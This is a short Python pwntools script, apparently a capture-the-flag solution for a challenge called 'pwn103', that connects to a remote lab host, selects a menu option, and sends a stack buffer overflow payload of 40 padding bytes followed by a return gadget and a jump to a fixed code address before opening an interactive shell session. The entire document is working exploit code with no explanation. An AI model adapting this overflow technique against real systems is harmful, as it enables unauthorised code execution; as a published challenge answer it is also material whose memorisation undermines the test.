#!/usr/bin/env python3

from pwn import *

#io = process("./pwn103.pwn103")

io = remote("10.10.79.13", 9003)

option = b"3"

payload = b"A"*40 + p64(0x401016) + p64(0x401554)

io.recv()
io.sendline(option)

io.recvuntil(b"[pwner]:")
io.sendline(payload)

io.recv()
io.interactive()
